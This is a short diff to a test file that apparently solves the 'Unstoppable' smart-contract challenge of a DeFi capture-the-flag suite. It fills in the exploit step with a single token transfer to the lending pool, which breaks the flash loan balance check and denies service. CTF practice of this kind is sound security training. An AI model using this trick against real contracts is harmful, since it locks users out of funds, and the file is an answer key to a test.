@@ -39,7 +39,9 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // Transfer tokens from attacker to Lender contract to break flash loan function
+        // on UnstoppableLender.sol:40
+        await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)
     });
 
     after(async function () {
